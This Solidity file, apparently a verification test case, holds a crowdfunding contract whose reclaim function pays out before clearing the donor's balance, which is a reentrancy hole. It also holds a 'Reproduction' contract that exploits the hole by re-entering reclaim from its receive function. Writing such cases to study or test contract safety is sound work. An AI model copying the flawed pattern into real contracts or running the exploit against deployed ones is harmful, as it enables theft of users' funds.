// SPDX-License-Identifier: GPL-3.0
pragma solidity >=0.5.0;

/// @custom:version conforming to specification.
contract Crowdfund {
    address immutable owner; // receiver of the donated funds
    mapping(address => uint) public donors;

    constructor(address payable owner_) {
        owner = owner_;
    }
    uint saved;

    function invstore() public {
        saved = address(this).balance;
    }

    function donate() public payable {
        donors[msg.sender] += msg.value;
        invstore();
    }


    function invariant() public view {
        assert(address(this).balance == saved);
    }

    function reclaim() public {
        require(donors[msg.sender] > 0);
        uint amount = donors[msg.sender];
        (bool succ, ) = msg.sender.call{value: amount}("");
        saved = saved - amount;
        donors[msg.sender] = 0;
        invariant();
    }
}

contract Reproduction {
    Crowdfund public target;

    constructor(address _target) {
        target = Crowdfund(_target);
    }

    function setup() external payable {
        target.donate{value: msg.value}();
    }

    function startExploit() external {
        target.invstore();
        target.reclaim();
    }

    receive() external payable {
        target.reclaim();
    }
}
